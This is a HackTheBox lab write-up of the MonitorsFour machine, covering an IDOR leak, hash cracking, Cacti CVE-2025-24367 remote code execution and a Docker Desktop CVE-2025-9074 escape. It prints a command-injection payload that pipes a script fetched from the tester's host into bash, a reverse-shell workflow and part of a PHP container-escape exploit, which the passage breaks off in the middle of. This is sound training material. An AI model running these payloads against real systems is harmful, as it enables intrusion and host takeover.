---
title: "Monitorsfour"
date: 2026-05-23 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [IDOR, CVE-2025-24367, Cacti-RCE, CVE-2025-9074, Docker-API-Abuse]
description: Writeup for HackTheBox Monitorsfour Machine
image:
  path: assets/img/monitorsfour/monitorsfour.png
  alt: HTB Monitorsfour
---

## Executive Summary

This writeup details the exploitation of **MonitorsFour**, a HackTheBox machine running Windows with Docker Desktop. The attack chain combines three critical vulnerabilities:

1. **IDOR Vulnerability** - Leaking database credentials and user information
2. **CVE-2025-24367** - Authenticated RCE in Cacti 1.2.28 via command injection  
3. **CVE-2025-9074** - Docker Desktop container escape to achieve root access

---

## Phase 1: Reconnaissance

### Network Discovery

The target machine is running a Windows host with Docker Desktop, exposed through Nginx on port 80 and WinRM on port 5985.

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan
Nmap scan report for 10.129.63.120
Host is up, received echo-reply ttl 127 (0.26s latency).
Scanned at 2025-12-07 20:30:29 PKT for 13s

PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key Findings:**
- **Port 80**: Nginx web server (likely reverse proxy to PHP application in Docker)
- **Port 5985**: Windows Remote Management (WinRM) - useful if we obtain valid credentials
- **PHPSESSID Cookie**: Indicates PHP application backend

#### DNS Configuration

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ echo "$ip  monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2: Initial Access

### Web Application Enumeration

The main website at `http://monitorsfour.htb/` presents itself as MonitorsFour, a "premium networking solutions provider". It's largely static content, so we perform directory and endpoint fuzzing.

<img src="assets/img/monitorsfour/web_home.png" alt="error loading image">

#### Directory Fuzzing

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ dirsearch -u http://monitorsfour.htb/ -x 403,404

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
Target: http://monitorsfour.htb/

[05:19:16] 200 -   97B  - /.env                                             
[05:19:54] 200 -  367B  - /contact                                          
[05:20:14] 200 -    4KB - /login                                                 
[05:20:39] 301 -  162B  - /static  ->  http://monitorsfour.htb/static/      
[05:20:47] 200 -   35B  - /user                                             
[05:20:49] 301 -  162B  - /views  ->  http://monitorsfour.htb/views/        
```

#### Contact Endpoint Error

The `/contact` endpoint triggers an error revealing the container filesystem structure:

<img src="assets/img/monitorsfour/contact_endpoint.png" alt="error loading image">

This confirms the application is running inside a Docker container.


### Exposed Environment File (Information Disclosure)

The `.env` file is **publicly accessible** at `/.env`, a critical misconfiguration in production environments. This file contains database credentials:

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ curl http://monitorsfour.htb/.env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

**Technical Details:**
- Environment files should **never** be served by the web server
- Database credentials allow direct MariaDB access on internal network
- The `mariadb` hostname indicates Docker networking is in use
- The path `/var/www/app/views/contact.php` reveals the application structure


### IDOR (Insecure Direct Object Reference)

The `/user` endpoint is protected but poorly implemented:

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ curl -s http://monitorsfour.htb/user | jq                 
{
  "error": "Missing token parameter"
}

┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ curl -s 'http://monitorsfour.htb/user?token=invalid' | jq
{
  "error": "Invalid or missing token"
}
```

#### IDOR Exploitation: Token Bypass

The API fails to properly validate the token parameter. Setting `token=0` bypasses all access controls:

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ curl -s 'http://monitorsfour.htb/user?token=0' | jq       
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```

Crack the hashes using rockyou breached passwords

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ curl -s 'http://monitorsfour.htb/user?token=0' | jq -r '.[] | "\(.username):\(.password)"' > hash.txt 

┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
wonderful1       (admin)     
1g 0:00:00:00 DONE (2026-05-24 05:33) 1.234g/s 17707Kp/s 17707Kc/s 53144KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

But the credentials `admin:wonderful1` are not valid for `http://monitorsfour.htb`. Let do password spray on WinRM using two found passwords `f37p2j8f4t0r` and `wonderful1`. The usernames are collected from the web page

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ netexec winrm $ip -u users.txt -p passwords.txt --continue-on-success 
WINRM       10.129.2.157    5985   MONITORSFOUR     [*] Windows 11 / Server 2025 Build 26100 (name:MONITORSFOUR) (domain:MonitorsFour) 
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\micheal:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\watson:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\mwaston:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\jennifer:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\anderson:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\janderson:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\david:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\thompson:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\dthompson:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\marcus:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\higgins:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\mhiggins:wonderful1
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\micheal:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\watson:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\mwaston:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\jennifer:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\anderson:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\janderson:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\david:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\thompson:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\dthompson:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\marcus:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\higgins:f37p2j8f4t0r
WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\mhiggins:f37p2j8f4t0r
```

All these credentails are invalid for WinRM.

### Vhost cacti.monitorsfour.htb

Lets fuzz virtual host, may we find another subdomain

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ gobuster vhost -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 40 --ad
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://monitorsfour.htb
[+] Method:                    GET
[+] Threads:                   40
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
#www.monitorsfour.htb Status: 400 [Size: 150]
#mail.monitorsfour.htb Status: 400 [Size: 150]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
```

Found subdomain `cacti.monitorsfour.htb`, add `cacti.monitorsfour.htb` to /etc/hosts

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ echo "$ip  cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

On accessing http://cacti.monitorsfour.htb/, we are directed to login page 

<img src="assets/img/monitorsfour/cacti_home.png" alt="error loading image">

Using credentials `marcus:wonderful1` we are successfully logged in 

<img src="assets/img/monitorsfour/cacti_dashboard.png" alt="error loading image">

Cacti version 1.2.28 is vulnerable to [CVE-2025-24367](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq). An authenticated Cacti user can abuse graph creation and graph template functionality to create arbitrary PHP scripts in the web root of the application, leading to remote code execution on the server.

### CVE-2025-24367
#### Explanation

According to Cacti Security Advisories

Cacti uses the rrdtool binary to generate graphs/images based on Round Robin Databases (RRD's). A number of switches can be set for the binary via the web UI, specifically within the graph template, or graph creation functionality.

Cacti attempts to sanitise the potentially tainted user input by escaping shell metacharacters. For example, in function rrd_function_process_graph_options() in lib/rrd.php

However, newline characters are not escaped or removed by the sanitisation logic and can be injected to break out of the command and spawn separate commands on the rrdtool binary, including calling other functionality such as RRD creation, restoration, dump etc.

By injecting multiple newlines it's possible to call this separate functionality in a single payload. The payload below includes two separate commands, the first creates a new RRD database that is used in the second command (otherwise the attacker would have to identify the path of an existing RRD file on the target system), the second creates a CSV 'graph' of the data within the newly created my.rrd RRD file, and saves to a file, with PHP code `` <?=`curl\x2010.10.14.108/shell.sh|bash`;?> `` embedded within it

```
XXX%0Acreate+my.rrd+--step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+XEoV1.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%3C%3F%3D%60curl%5Cx2010%2E10%2E14%2E108%2Fshell%2Esh%7Cbash%60%3B%3F%3E
```

Use graph creation or graph template functionality to inject the payload into a vulnerable rrdtool switch, ie. `--right-axis-label`

```
POST /cacti/graph_templates.php?header=false HTTP/1.1
Host: cacti.monitorsfour.htb
User-Agent: python-requests/2.32.5
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: Cacti=a549373f0825854d621c72a860218608
Content-Length: 894
Content-Type: application/x-www-form-urlencoded

__csrf_magic=sid%3A1dcc9c6a88c857a829828cf0d4c7983a50c4ea9e%2C1779603184&name=Unix+-+Logged+in+Users&graph_template_id=226&graph_template_graph_id=226&save_component_template=1&title=%7Chost_description%7C+-+Logged+in+Users&vertical_label=percent&image_format_id=3&height=200&width=700&base_value=1000&slope_mode=on&auto_scale=on&auto_scale_opts=2&auto_scale_rigid=on&upper_limit=100&lower_limit=0&unit_value=&unit_exponent_value=&unit_length=&right_axis=&right_axis_label=XXX%0Acreate+my.rrd+--step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+XEoV1.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%%3C%3F%3D%60curl%5Cx2010%2E10%2E14%2E108%2Fshell%2Esh%7Cbash%60%3B%3F%3E&right_axis_format=0&right_axis_formatter=0&left_axis_formatter=0&auto_padding=on&tab_width=30&legend_position=0&legend_direction=0&rrdtool_version=1.7.2&action=save
```

#### Exploitation

Using the [CyberGeek POC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/tree/main), to automate the exploit, as weak character escaping may causes issue

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git                                                    
Cloning into 'CVE-2025-24367-Cacti-PoC'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 2 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 6.63 KiB | 6.63 MiB/s, done.
Resolving deltas: 100% (1/1), done.            
```

Setup the listener

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ ncat -lvnp 4444
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
```

Run the exploit, `-i` arguement for your tun0 ip and `--port` for local listening port

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour/CVE-2025-24367-Cacti-PoC]
└─$ python3 exploit.py -u marcus -p wonderful1 --url http://cacti.monitorsfour.htb -i 10.10.14.108 --port 4444
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: XEoV1.php
[+] Got payload: /bash
[i] Created PHP filename: D5btc.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

Got reverse shell

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ ncat -lvnp 4444
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.2.157:53895.
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@821fbd6a43fa:~/html/cacti$ 
```

Upgrade the shell

```shell
www-data@821fbd6a43fa:~/html/cacti$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.

# Press Ctrl+Z
www-data@821fbd6a43fa:~/html/cacti$ ^Z
zsh: suspended  ncat -lvnp 4444                                                                                                                  
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ stty -echo raw; fg                         
[1]  + continued  ncat -lvnp 4444
                                 reset
reset: unknown terminal type unknown
Terminal type? screen
```

Set remote tty dimension equal to local terminal window

```shell
┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
└─$ stty -a | head -n 1
speed 38400 baud; rows 37; columns 145; line = 0;        
```

```shell
www-data@821fbd6a43fa:~/html/cacti$ stty rows 37 cols 145
www-data@821fbd6a43fa:~/html/cacti$ export TERM=xterm
```

### User Flag

The user `marcus` home directory is world readable

```shell
www-data@821fbd6a43fa:~/html/cacti$ ls -la /home
total 16
drwxr-xr-x 1 root   root   4096 Nov 10  2025 .
drwxr-xr-x 1 root   root   4096 May 24 06:51 ..
drwxr-xr-x 1 marcus marcus 4096 May 24 00:19 marcus
```

the flag is located at `/home/marcus/flag.txt`

```
www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt 
**************05781ba8a67cd9e4
```

## Privilege Escalation

### CVE-2025-9074 

We are in docker container

```shell
www-data@821fbd6a43fa:/tmp$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 5a:a7:35:77:d5:3c brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

www-data@821fbd6a43fa:/tmp$ cat /etc/resolv.conf
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal

www-data@821fbd6a43fa:/tmp$ ls -l /.dockerenv 
-rwxr-xr-x 1 root root 0 Nov 10  2025 /.dockerenv

www-data@821fbd6a43fa:/tmp$ find / -iname *docker* 2>/dev/null
/var/www/html/cacti/include/fa/svgs/brands/docker.svg
/var/www/app/static/admin/assets/js/plugins/editors/ace/mode-dockerfile.js
/var/www/app/static/admin/assets/js/plugins/editors/ace/snippets/dockerfile.js
/etc/dpkg/dpkg.cfg.d/docker
/etc/dpkg/dpkg.cfg.d/docker-apt-speedup
/etc/apt/apt.conf.d/docker-gzip-indexes
/etc/apt/apt.conf.d/docker-autoremove-suggests
/etc/apt/apt.conf.d/docker-no-languages
/etc/apt/apt.conf.d/docker-clean
/usr/local/etc/php/conf.d/docker-php-ext-mysqli.ini
/usr/local/etc/php/conf.d/docker-php-ext-pdo_mysql.ini
/usr/local/etc/php/conf.d/docker-php-ext-gd.ini
/usr/local/etc/php/conf.d/docker-fpm.ini
/usr/local/etc/php/conf.d/docker-php-ext-sodium.ini
/usr/local/etc/php/conf.d/docker-php-ext-opcache.ini
/usr/local/etc/php-fpm.d/zz-docker.conf
/usr/local/etc/php-fpm.d/docker.conf
/usr/local/bin/docker-php-entrypoint
/usr/local/bin/docker-php-ext-install
/usr/local/bin/docker-php-ext-enable
/usr/local/bin/docker-php-ext-configure
/usr/local/bin/docker-php-source
/.dockerenv

www-data@821fbd6a43fa:/tmp$ hostname
821fbd6a43fa
```

Running docker enumeration script [deepce.sh](https://github.com/stealthcopter/deepce/blob/main/deepce.sh), found the docker environment is vulnerable to [CVE-2025-9074]

```shell
www-data@821fbd6a43fa:/tmp$ ./deepce.sh 

                      ##         .
                ## ## ##        ==                                                                                                               
             ## ## ## ##       ===                                                                                                               
         /"""""""""""""""""\___/ ===                                                                                                             
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~                                                                                                      
         \______ X           __/
           \    \         __/                                                                                                                    
            \____\_______/                                                                                                                       
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines                                                                                                                          

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window                                                                                  
See https://stealthcopter.github.io/deepce                                                                                                       

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... www-data
[+] Groups .................. www-data
[+] Sudo .................... sudo not found
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ 821fbd6a43fa
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.18.0.2 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.18.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 6.6.87.2-microsoft-standard-WSL2
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7302P 16-Core Processor
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/gcc                                                                                                                                     
/usr/bin/hostname                                                                                                                                
[+] Dangerous Capabilities .. Yes
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap                                                                                                   
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore                                                                                                                                      
[+] SSHD Service ............ Unknown (ps not installed)
[+] Privileged Mode ......... Unknown
[+] Docker API exposed ...... Yes (192.168.65.7:2375)
[+] └── CVE-2025-9074 ....... Yes
Docker Desktop versions between 4.25 to 4.44.2 on Windows and MacOS are vulnerable to a 
container escape via a malicious image. See                                                                                                      
https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape                                                                     
```

**CVE-2025-9074:** A vulnerability was identified in Docker Desktop that allows local running Linux containers to access the Docker Engine API via the configured Docker subnet, at 192.168.65.7:2375 by default. This vulnerability occurs with or without Enhanced Container Isolation (ECI) enabled, and with or without the "Expose daemon on tcp://localhost:2375 without TLS" option enabled.
This can lead to execution of a wide range of privileged commands to the engine API, including controlling other containers, creating new ones, managing images etc. In some circumstances (e.g. Docker Desktop for Windows with WSL backend) it also allows mounting the host drive with the same privileges as the user running Docker Desktop. In short we can manage docker containers as a unprivileged user and can mount host filesystem

docker desktop and API version

```shell
www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/version | php -r 'echo json_encode(json_decode(file_get_contents("php://stdin")), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;'
{
    "Platform": {
        "Name": "Docker Engine - Community"
    },
    "Components": [
        {
            "Name": "Engine",
            "Version": "28.3.2",
            "Details": {
                "ApiVersion": "1.51",
                "Arch": "amd64",
                "BuildTime": "2025-07-09T16:13:55.000000000+00:00",
                "Experimental": "false",
                "GitCommit": "e77ff99",
                "GoVersion": "go1.24.5",
                "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
                "MinAPIVersion": "1.24",
                "Os": "linux"
            }
        },
        {
            "Name": "containerd",
            "Version": "1.7.27",
            "Details": {
                "GitCommit": "05044ec0a9a75232cad458027ca83437aae3f4da"
            }
        },
        {
            "Name": "runc",
            "Version": "1.2.5",
            "Details": {
                "GitCommit": "v1.2.5-0-g59923ef"
            }
        },
        {
            "Name": "docker-init",
            "Version": "0.19.0",
            "Details": {
                "GitCommit": "de40ad0"
            }
        }
    ],
    "Version": "28.3.2",
    "ApiVersion": "1.51",
    "MinAPIVersion": "1.24",
    "GitCommit": "e77ff99",
    "GoVersion": "go1.24.5",
    "Os": "linux",
    "Arch": "amd64",
    "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
    "BuildTime": "2025-07-09T16:13:55.000000000+00:00"
}
```

Found alpine image, which we can utilize to mount host file system to read files

```shell
www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | php -r 'echo json_encode(json_decode(file_get_contents("php://stdin")), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;'
[
    {
        "Containers": 1,
        "Created": 1762794130,
        "Id": "sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666",
        "Labels": {
            "com.docker.compose.project": "docker_setup",
            "com.docker.compose.service": "nginx-php",
            "com.docker.compose.version": "2.39.1"
        },
        "ParentId": "",
        "Descriptor": {
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "digest": "sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666",
            "size": 856
        },
        "RepoDigests": [
            "docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"
        ],
        "RepoTags": [
            "docker_setup-nginx-php:latest"
        ],
        "SharedSize": -1,
        "Size": 1277167255
    },
    {
        "Containers": 1,
        "Created": 1762791053,
        "Id": "sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40",
        "Labels": {
            "com.docker.compose.project": "docker_setup",
            "com.docker.compose.service": "mariadb",
            "com.docker.compose.version": "2.39.1",
            "org.opencontainers.image.authors": "MariaDB Community",
            "org.opencontainers.image.base.name": "docker.io/library/ubuntu:noble",
            "org.opencontainers.image.description": "MariaDB Database for relational SQL",
            "org.opencontainers.image.documentation": "https://hub.docker.com/_/mariadb/",
            "org.opencontainers.image.licenses": "GPL-2.0",
            "org.opencontainers.image.ref.name": "ubuntu",
            "org.opencontainers.image.source": "https://github.com/MariaDB/mariadb-docker",
            "org.opencontainers.image.title": "MariaDB Database",
            "org.opencontainers.image.url": "https://github.com/MariaDB/mariadb-docker",
            "org.opencontainers.image.vendor": "MariaDB Community",
            "org.opencontainers.image.version": "11.4.8"
        },
        "ParentId": "",
        "Descriptor": {
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "digest": "sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40",
            "size": 856
        },
        "RepoDigests": [
            "docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"
        ],
        "RepoTags": [
            "docker_setup-mariadb:latest"
        ],
        "SharedSize": -1,
        "Size": 454269972
    },
    {
        "Containers": 2,
        "Created": 1759921496,
        "Id": "sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412",
        "Labels": null,
        "ParentId": "",
        "Descriptor": {
            "mediaType": "application/vnd.oci.image.index.v1+json",
            "digest": "sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412",
            "size": 9218
        },
        "RepoDigests": [
            "alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"
        ],
        "RepoTags": [
            "alpine:latest"
        ],
        "SharedSize": -1,
        "Size": 12794775
    }
]
```

Since php is installed on container, therefore using AI I rewrote [PtechAmanja Python POC](https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape/blob/main/exploit.py) in php

```php
#!/usr/bin/env php
<?php

define('TIMEOUT', 60);

function demux_docker_logs($raw) {
    /**
     * Docker stream format: [8]byte{STREAM_TYPE, 0, 0, 0, SIZE1, SIZE2, SIZE3, SIZE4}[SIZE]byte{STREAM_DATA}
     * STREAM_TYPE: 1=stdout, 2=stderr
     * SIZE: uint32 in big-endian format
     */
    $output = "";
    $i = 0;
    while ($i + 8 <= strlen($raw)) {
        $frame_size = unpack('N', substr($raw, $i + 4, 4))[1];
        if ($i + 8 + $frame_size <= strlen($raw)) {
            $output .= substr($raw, $i + 8, $frame_size);
            $i += 8 + $frame_size;
        } else {
            break;
        }
    }
    return $output;
}

function print_banner() {
    echo <<<'BANNER'
╔═══════════════════════════════════════════════════════╗
║          CVE-2025-9074 - Docker Engine API RCE        ║
║      Unauthenticated Privileged Container Escape      ║
║               Docker Desktop < 4.44.3                 ║
╚═══════════════════════════════════════════════════════╝
BANNER;
}

function get_bind_mount($os) {
    switch (strtolower($os)) {
        case 'windows':
            return '/mnt/host/c:/mnt/hostfs';
        case 'mac':
            return '/:/mnt/hostfs';
        case 'linux':
        default:
            return '/:/mnt/hostfs';
    }
}

function docker_api($url, $method, $endpoint, $data = null, $return_raw = false) {
    $ch = curl_init("{$url}{$endpoint}");
